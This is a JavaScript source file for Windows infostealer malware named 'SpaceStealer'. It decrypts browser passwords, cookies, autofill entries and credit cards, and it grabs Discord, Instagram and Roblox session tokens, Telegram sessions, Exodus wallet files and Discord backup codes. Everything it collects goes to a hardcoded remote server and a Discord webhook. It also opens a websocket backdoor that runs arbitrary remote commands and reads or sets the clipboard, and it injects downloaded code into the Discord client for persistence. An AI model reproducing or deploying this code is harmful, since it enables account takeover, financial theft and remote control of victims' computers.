const fs = require("fs"); const path = require("path"); const httpx = require("axios");
const os = require('os'); const crypto = require("crypto"); const AdmZip = require('adm-zip');
const osu = require('node-os-utils'); const { execSync, exec: exec } = require("child_process");
const dpapi = require("win-dpapi"); const sqlite3 = require("sqlite3"); const FormData = require('form-data')
const clipboard = require('clipboardy'); const WebSocket = require('ws'); const { exit } = require("process");
const { WebhookClient, MessageAttachment, MessageEmbed } = require('discord.js'); 

let config = { 'api_url': 'https://voleur.xyz', 'api_auth': '__Astroz_Auth_Here__', 'websocket_url': 'ws://57.128.163.235:3200' };

const local = process.env.LOCALAPPDATA;
const appdata = process.env.APPDATA;
const localappdata = process.env.LOCALAPPDATA;

const discords = []; const injection_paths = [];

const 
browser_paths = [ localappdata+'\\Google\\Chrome\\User Data\\Default\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 1\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 2\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 3\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 4\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 5\\',localappdata+'\\Google\\Chrome\\User Data\\Guest Profile\\',localappdata+'\\Google\\Chrome\\User Data\\Default\\Network\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 1\\Network\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 2\\Network\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 3\\Network\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 4\\Network\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 5\\Network\\',localappdata+'\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',appdata+'\\Opera Software\\Opera Stable\\',appdata+'\\Opera Software\\Opera GX Stable\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',localappdata+'\\Microsoft\\Edge\\User Data\\Default\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 1\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 2\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 3\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 4\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 5\\',localappdata+'\\Microsoft\\Edge\\User Data\\Guest Profile\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Default\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];

function GetInternetProtocol() {
    return new Promise(async resolve => {
        response = await httpx.get('https://api.ipify.org/');
        resolve(response.data)
    })
}

async function GetInstaData(session_id) {
    let data = {}; let headers = { "Host": "i.instagram.com", "X-Ig-Connection-Type": "WiFi", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Ig-Capabilities": "36r/Fx8=", "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+", "X-Ig-App-Locale": "en", "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt", "Accept-Encoding": "gzip, deflate",  "Cookie": `sessionid=${session_id};` };
    let response = await httpx.get(`https://i.instagram.com/api/v1/accounts/current_user/?edit=true`, { headers: headers }).catch(error => { return false; })
    
    data['username'] = response.data.user.username, data['verified'] = response.data.user.is_verified, data['avatar'] = response.data.user.profile_pic_url, data['sessionid'] = session_id;
        
    return data
}

let client;
;(async() => {
    let response = await httpx.get(`${config['api_url']}/check?key=${config.api_auth}`)
    client = new WebhookClient({ url: response.data });
})()

async function SubmitInstagram(session_id) {
    let data = await GetInstaData(session_id)
    let ip_addy = await GetInternetProtocol()

    response = httpx.post(`${config['api_url']}/api/instagram?auth=${config['api_auth']}&ip=${ip_addy}`, { verified: data.verified, avatar: data.avatar, token: data.sessionid, username: data.username })
}

async function GetRobloxData(secret_cookie) {
    let data = {}; let headers = { 'accept': 'application/json, text/plain, */*', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9,hi;q=0.8', 'cookie': `.ROBLOSECURITY=${secret_cookie.toString()};`,  'origin': 'https://www.roblox.com', 'referer': 'https://www.roblox.com', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36' }
    let response = await httpx.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });

    data['username'] = response.data['UserName']; data['avatar'] = response.data['ThumbnailUrl']; data['robux'] = response.data['RobuxBalance']; data['premium'] = response.data['IsPremium']
    return data
}

async function SubmitRoblox(secret_cookie) {
    let data = await GetRobloxData(secret_cookie)
    response = httpx.post(`${config['api_url']}/api/roblox?auth=${config['api_auth']}`, {  premium: data.premium, avatar: data.avatar, token: `.ROBLOSECURITY=${secret_cookie.toString()}`, username: data.username, robux: data.robux  })
}

async function UpdateInformation(websocket) {
    const cpu = osu.cpu; let send_info = true; const sleep = s => new Promise(e => setTimeout(e, s)); 
    while (send_info) {
        let cords = []
        exec('tasklist', (err, stdout) => {
            for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                if (stdout.includes(executable)) { let cord = executable.split('.')[0]; cords.push(cord) }
            }

            cpu.usage().then(cpu_usage => { websocket.send(JSON.stringify({ key: config['api_auth'], hostname: os.hostname(), event: 'updateinfo', discords: { opened: cords, injected: true}, cpu: { model: os.cpus()[0].model, 'usage': cpu_usage}, time: Date() })) })
        })

        await sleep(2000)
    }
}

function GetTokensFromPath(tokenPath) {
    let path_tail = tokenPath; tokenPath += "\\Local Storage\\leveldb"; let tokens = [];

    if (tokenPath.includes('cord')) {
        if (fs.existsSync(tokenPath)) {
            try {
                fs.readdirSync(tokenPath).map(file => {
                    (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(tokenPath + '\\' + file, 'utf8').split(/\r?\n/).forEach(line => {
                        const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);
                        const foundTokens = line.match(pattern);
                                
                        if (foundTokens) {
                            foundTokens.forEach(token => {
                                const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + '\\' + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);
                                const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
                                
                                token = Buffer.from(token.split('dQw4w9WgXcQ:')[1], 'base64')
                                
                                const start = token.slice(3, 15);
                                const middle = token.slice(15, token.length - 16)
                                const end = token.slice(token.length - 16, token.length);
                                const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);

                                decipher.setAuthTag(end);
                                let out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
                                
                                if (!tokens.includes(out)) tokens.push(out);
								
                            })
                        }
                    });
                });
            } catch (e) { console.log(e) }
            return tokens;
        }
    } else {
        try {
            fs.readdirSync(path.normalize(tokenPath)).map((file) => {
                if (file.endsWith(".log") || file.endsWith(".ldb")) {
                    fs.readFileSync(`${tokenPath}\\${file}`, "utf8") .split(/\r?\n/) .forEach(async (line) => {
                        const regex = [ new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g), ];
                        for (const _regex of regex) {
                            const token = line.match(_regex);

                            if (token) {
                                token.forEach((element) => {
                                    tokens.push(element);
                                });
                            }
                        }
                    });
                }
            });
        } catch (e) {}
    }
    return tokens;
}

async function ParseCookies(path) {
    const path_split = path.split("\\");
    const path_tail = (path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2)).join("\\") + "\\";

    if (path.startsWith(appdata) && (path_tail = path), fs.existsSync(path_tail)) {
        const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "Local State")).os_crypt.encrypted_key, "base64").slice(5);
        const cookies = path + "Cookies"; const cookies_db = path + "cookies.db"; const total_cookies = 0;

        fs.copyFileSync(cookies, cookies_db);

        const key = dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
        let result = "";
        const sql = new sqlite3.Database(cookies_db, (err => { if (err) return; }));

        result += `@~$~@astroz-${path}\n`;

        return await new Promise((resolve => {
            sql.each("SELECT host_key, name, encrypted_value FROM cookies", (function (error, row) {
                if (!error) {
                    const encrypted_value = row.encrypted_value;
                    try {
                        if (1 == encrypted_value[0] && 0 == encrypted_value[1] && 0 == encrypted_value[2] && 0 == encrypted_value[3]) {
                            result += `HOST KEY: ${row.host_key} | NAME: ${row.name} | VALUE: ${dpapi.unprotectData(encrypted_value,null,"CurrentUser")+"\n".toString("utf-8")}\n`
                        } else {
                            const start = encrypted_value.slice(3, 15);
                            const middle = encrypted_value.slice(15, encrypted_value.length - 16);
                            const end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length);
                            const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

                            decipher.setAuthTag(end);

                            if (row.host_key === '.instagram.com' && row.name === 'sessionid') SubmitInstagram(`${decipher.update(middle,"base64","utf-8")+decipher.final("utf-8")}`)
                            if (row.name === '.ROBLOSECURITY') SubmitRoblox(`${decipher.update(middle,"base64","utf-8")+decipher.final("utf-8")}`)
                            result += `HOST KEY: ${row.host_key} | NAME: ${row.name} | VALUE: ${decipher.update(middle,"base64","utf-8")+decipher.final("utf-8")}\n`

                        }
                    } catch (e) {}
                }
            }), function () {
                resolve(result);
            });
        }))

    }
    return ""
}

async function ParsePasswords(path) {
    const path_split = path.split("\\");
    const path_tail = (path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2)).join("\\") + "\\";

    if (path.startsWith(appdata) && (path_tail = path), fs.existsSync(path_tail)) {
        const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "Local State")).os_crypt.encrypted_key, "base64").slice(5);
        const login_data = path + "Login Data"; const passwords_db = path + "passwords.db";

        fs.copyFileSync(login_data, passwords_db);

        const key = dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
        let result = ""
        const sql = new sqlite3.Database(passwords_db, (err => { if (err) return }));

        result += `@~$~@astroz-${path}\n`;

        return await new Promise((resolve => {
            sql.each("SELECT origin_url, username_value, password_value FROM logins", (function (error, row) {
                if (!error) {
                    let password_value = row.password_value;
                    try {
                        if (1 == password_value[0] && 0 == password_value[1] && 0 == password_value[2] && 0 == password_value[3]) {
                            result += `URL: ${row.origin_url} | USERNAME : ${row.username_value} | PASSWORD: ${dpapi.unprotectData(password_value,null,"CurrentUser").toString("utf-8")}\n`;
                        } else {
                            const start = password_value.slice(3, 15);
                            const middle = password_value.slice(15, password_value.length - 16);
                            const end = password_value.slice(password_value.length - 16, password_value.length);
                            const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);
                            
                            decipher.setAuthTag(end)
                            result += `URL: ${row.origin_url} | USERNAME : ${row.username_value} | PASSWORD: ${decipher.update(middle,"base64","utf-8")+decipher.final("utf-8")}\n`
                        }
                    } catch (e) {}
                } 
            }), function () {
                resolve(result);
            });
        }))
    }
    return ""
}

async function ParseAutofill(path) {
    let path_split = path.split("\\");
    const path_tail = (path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2)).join("\\") + "\\";
    
    if (path.startsWith(appdata) && (path_tail = path), fs.existsSync(path_tail)) {
        const autofill_data = path + "Web Data";
        const autofill_db = path + "Web.db";
        
        fs.copyFileSync(autofill_data, autofill_db);
        
        let result = "";
        const sql = new sqlite3.Database(autofill_db, (err => { if (err) return }));
        
        result += `@~$~@astroz-${path}\n`;
        
        return await new Promise((resolve => {
            sql.each("SELECT * FROM autofill", (function(error, row) {
                row && (result += `NAME: ${row.name} | VALUE : ${row.value}\n`)
            }), function () {
                resolve(result);
            });
        }))
    }
    return ""
}

async function ParseCards(path) {
    let path_split = path.split('\\'), path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2), path_tail = path_split_tail.join('\\') + '\\';
    
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    
    if (fs.existsSync(path_tail)) {
        const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);
        
        const login_data = path + 'Web Data'; 
        const creditcards_db = path + 'creditcards.db';
        fs.copyFileSync(login_data, creditcards_db);
        
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        let result = `@~$~@astroz-${path}\n`;
        const sql = new sqlite3.Database(creditcards_db, err => { if (err) { } });

        const cards = await new Promise((resolve, reject) => {
            sql.each('SELECT * FROM credit_cards', function (error, row) {
                if (!error || row['card_number_encrypted'] != '') {
                    let card_number = row['card_number_encrypted'];
                    try {
                        if ((card_number[0] == 1) && (card_number[1] == 0) && (card_number[2] == 0) && (card_number[3] == 0)) {
                            result += 'CC NUMBER: ' + dpapi.unprotectData(card_number, null, 'CurrentUser').toString('utf-8') + ' | EXPIRY: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'] + '\n';
                        } else {
                            const start = password_value.slice(3, 15);
                            const middle = password_value.slice(15, password_value.length - 16);
                            const end = password_value.slice(password_value.length - 16, password_value.length);
                            const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);
                            
                            decipher.setAuthTag(end)
                            result += 'CC NUMBER: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + ' | EXPIRY: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'] + '\n';
                        }
                    } catch (e) { }
                }
            }, function () {
                resolve(result);
            });
        });

        return cards;
    }
    return '';
}

class SpaceStealer {
    constructor () {
        //require("node-hide-console-window").hideConsole();

        this.SubmitTelegram(); this.StealTokens(); this.InfectDiscords();
        this.RestartDiscords(); this.SubmitBackupCodes(); this.SubmitPasswords();
        this.SubmitCookies(); this.SubmitCards(); this.SubmitAutofill();
        this.SubmitExodus();

        this.websocket = new WebSocket(config['websocket_url']);

        this.websocket.on('open', async() => {
            this.websocket.send(JSON.stringify({ key: config['api_auth'], hostname: os.hostname(), event: 'open' })); await UpdateInformation(this.websocket)
        })

        this.websocket.on('close', async() => {
            exit()
        })

        this.websocket.on('message', async (data) => {
            let message = JSON.parse(data);
            
            switch (message['task']) {
                case 'restartcord':
                    exec(`taskkill /F /T /IM ${message['type']}.exe`, (err) => {})
                    exec(`"${process.env.LOCALAPPDATA}\\${message['type']}\\Update.exe" --processStart ${message['type']}.exe`, (err) => {})
                break;
                
                case 'exec':
                    exec(`${message['command']}`, (err, stdout) => {
                        let embed = new MessageEmbed()
                        .setAuthor('Remote Code Execution 👀', "https://media.discordapp.net/attachments/990303435528212532/990308980893048852/spacex_logo.gif")
                        .setDescription(`<a:spacex:1069286960927092807> **Response:**\n\`${stdout}\``)
                        .addField(`<:spacex:1069286971500937216> Command:`, `\`${message['command']}\``)
                        .addField(`<:spacex:1069286956225286164> Hostname:`, `\`${os.hostname()}\``)
                        .setColor(`#303037`)
                        .setFooter('@spacestealer')
        
                        client.send({ embeds: [embed] })
                    })
                break;
    
                case 'getclip':
                    let clipboardd = clipboard.readSync();
                    let embed = new MessageEmbed()
                    .setAuthor('Clipboard Data 👀', "https://media.discordapp.net/attachments/990303435528212532/990308980893048852/spacex_logo.gif")
                    .setDescription(`<a:spacex:1069286960927092807> **Clipboard:**\n\`${clipboardd}\` [Copy](https://api.spacestaler.gg/copy)`)
                    .addField(`<:spacex:1069286956225286164> Hostname:`, `\`${os.hostname()}\``, "https://media.discordapp.net/attachments/990303435528212532/990308980893048852/spacex_logo.gif")
                    .setColor(`#303037`)
                    .setFooter('@spacestealer')
        
                    client.send({ embeds: [embed] })
                break;
    
                case 'setclip':
                    clipboard.writeSync(message['text']);
                break;
    
                case 'reinject':
                    this.InfectDiscords();
                break;
    
                case 'passwords':
                    this.SubmitPasswords()
                break;
    
                case 'cookies':
                    this.SubmitCookies();
                break;
    
                case 'backupcodes':
                    this.SubmitBackupCodes();
                break;
            }
        })
    }

    async SubmitCookies() {
        let cookies = "";
        for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Cookies") && (cookies += await ParseCookies(browser_paths[i]) || "");
        fs.writeFile(appdata + "\\cookies.txt", cookies, (function(err) {
            if (err) throw err;
            httpx.post(`${config['api_url']}/api/cookies?auth=${config['api_auth']}`, {
                cookies: cookies
            })
        }))
    }

    async SubmitPasswords() {
        let passwords = "";
        for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Login Data") && (passwords += await ParsePasswords(browser_paths[i]) || "");
        fs.writeFile(appdata + "\\passwords.txt", passwords, (function(err) {
            if (err) throw err;
            httpx.post(`${config['api_url']}/api/passwords?auth=${config['api_auth']}`, {
                pass: passwords
            })
        }))
    }
    
    async SubmitAutofill() {
        let autofills = "";
        for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Web Data") && (autofills += await ParseAutofill(browser_paths[i]) || "");
        fs.writeFile(appdata + "\\autofilldata.txt", autofills, (function(err) {
            if (err) throw err;
            httpx.post(`${config['api_url']}/api/autofill?auth=${config['api_auth']}`, {
                autofill: autofills
            })
        }))
    }
    
    async SubmitCards() {
        let creditcards = "";
        for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Web Data") && (creditcards += await ParseCards(browser_paths[i]) || "");
        fs.writeFile(appdata + "\\creditcards.txt", creditcards, (function(err) {
            if (err) throw err;
            httpx.post(`${config['api_url']}/api/creditcards?auth=${config['api_auth']}`, {
                cards: creditcards
            })
        }))
    }

    SubmitBackupCodes() {
        const home_dir = require('os').homedir(); let codes = "";
        
       if (fs.existsSync(`${home_dir}\\Downloads`)) {
       fs.readdirSync(`${home_dir}\\Downloads`).forEach(file => {
           if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
               let path = `${home_dir}\\Downloads\\${file}`
               const text = fs.readFileSync(path, 'utf-8')
               codes += `# ${home_dir}\\Downloads\\${file}\n\n${text}\n\n`;
           }
       })
       }
       
       if (fs.existsSync(`${home_dir}\\Desktop`)) {
       fs.readdirSync(`${home_dir}\\Desktop`).forEach(file => {
           if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
               let path = `${home_dir}\\Desktop\\${file}`
               const text = fs.readFileSync(path, 'utf-8')
               codes += `# ${home_dir}\\Desktop\\${file}\n\n${text}\n\n`;
           }
       })
       }
   
       if (fs.existsSync(`${home_dir}\\Documents`)) {
       fs.readdirSync(`${home_dir}\\Documents`).forEach(file => {
           if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
               let path = `${home_dir}\\Documents\\${file}`
               const text = fs.readFileSync(path, 'utf-8')
               codes += `# ${home_dir}\\Documents\\${file}\n\n${text}\n\n`;
           }
       })
       }
   
       httpx.post(`${config['api_url']}/api/backupcodes?auth=${config['api_auth']}`, {
           codes: codes
       })
    }   
    
    async SubmitTelegram() {
        if (fs.existsSync(appdata + '\\Telegram Desktop\\tdata')) {
            
            let zip = new AdmZip();
        
            session_files = []
            
            fs.readdir(appdata + '\\Telegram Desktop\\tdata', (err, file) => {
                file.forEach((inside_file) => {
                    if (inside_file !== 'temp' && inside_file !== 'dumps' && inside_file !== 'emoji' && inside_file !== 'working' && inside_file !== 'tdummy') { 
                        session_files.push(`${inside_file}`)
                    }
                })
        
                session_files.forEach(session_file => {
                    let i = appdata + `\\Telegram Desktop\\tdata\\${session_file}`;
                    (fs.statSync(i).isFile() ? zip.addLocalFile(i) : zip.addLocalFolder(i, e));
                })
        
                zip.writeZip(`TelegramSession.zip`)
                
                httpx.get(`${config['api_url']}/check?key=${config['api_auth']}`).then(res => {
                    webhook = res.data;
                    const form = new FormData();
                    form.append("file", fs.createReadStream("TelegramSession.zip"));
                    form.submit(webhook, (error, response) => { fs.unlinkSync('TelegramSession.zip') });
                })
            })
        }
    }
    
    StealTokens() {
        let paths;
      
        if (process.platform == "win32") {
          const local = process.env.LOCALAPPDATA;
          const roaming = process.env.APPDATA;
      
          paths = {
            Discord: path.join(roaming, "Discord"),
            "Discord Canary": path.join(roaming, "discordcanary"),
            "Discord PTB": path.join(roaming, "discordptb"),
            "Google Chrome": path.join(local, "Google", "Chrome", "User Data", "Default"),
            Opera: path.join(roaming, "Opera Software", "Opera Stable"),
            Brave: path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default" ),
            Yandex: path.join(local, "Yandex", "YandexBrowser", "User Data", "Default" ),
          };
        }
      
        const tokens = {};
        for (let [platform, path] of Object.entries(paths)) {
          const tokenList = GetTokensFromPath(path);
          if (tokenList) {
            tokenList.forEach((token) => {
              this.sendTokenToBackend(token)
              if (tokens[platform] === undefined) tokens[platform] = [];
              tokens[platform].push(token);
            });
          }
        }
    }

    async RestartDiscords() {
        exec('tasklist', (err, stdout) => {
            for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                if (stdout.includes(executable)) {
                    exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                    exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
                }
            }
        })    
    }

    sendTokenToBackend(token) {
        GetInternetProtocol().then(response => {
            httpx.get(`${config['api_url']}/api/grabuser?token=${token}&ip=${response}&auth=${config['api_auth']}`)
        })
    }

    async SubmitExodus() {
        const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\exodus.wallet`;
        if (fs.existsSync(file)) {
            const zipper = new AdmZip(); zipper.addLocalFolder(file);
            
            zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`)

            httpx.get(`${config['api_url']}/check?key=${config['api_auth']}`).then(res => {
                let webhook = res.data;
                const form = new FormData();
                form.append("file", fs.createReadStream(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`));
                form.submit(webhook, (error, response) => { fs.unlinkSync(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`) });
            })
        }
    }
    
    async InfectDiscords() {
        var injection, betterdiscord = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
        if (fs.existsSync(betterdiscord)) {
            var read = fs.readFileSync(dir);
            fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "spacestealerxD"))
        }
        await httpx(`${config['api_url']}/secrets/void/injection/uwu`).then((code => code.data)).then((res => {
            res = res.replace("%API_AUTH_HERE%", config['api_auth']), injection = res
        })).catch(), await fs.readdir(local, (async (err, files) => {
            await files.forEach((async dirName => {
                dirName.toString().includes("cord") && await discords.push(dirName)
            })), discords.forEach((async discordPath => {
                await fs.readdir(local + "\\" + discordPath, ((err, file) => {
                    file.forEach((async insideDiscordDir => {
                        insideDiscordDir.includes("app-") && await fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir, ((err, file) => {
                            file.forEach((async insideAppDir => {
                                insideAppDir.includes("modules") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir, ((err, file) => {
                                    file.forEach((insideModulesDir => {
                                        insideModulesDir.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir, ((err, file) => {
                                            file.forEach((insideCore => {
                                                insideCore.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore, ((err, file) => {
                                                    file.forEach((insideCoreFinal => {
                                                        insideCoreFinal.includes("index.js") && (fs.mkdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\spacex", (() => {
                                                        })), 
                                                        
                                                        fs.writeFile(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js", injection, (() => {})))
                                                        if (!injection_paths.includes(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")) {
                                                            injection_paths.push(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js"); 
                                                        }
                                                    }))
                                                }))
                                            }))
                                        }))
                                    }))
                                }))
                            }))
                        }))
                    }))
                }))
            }))
        }))
    }
}

new SpaceStealer()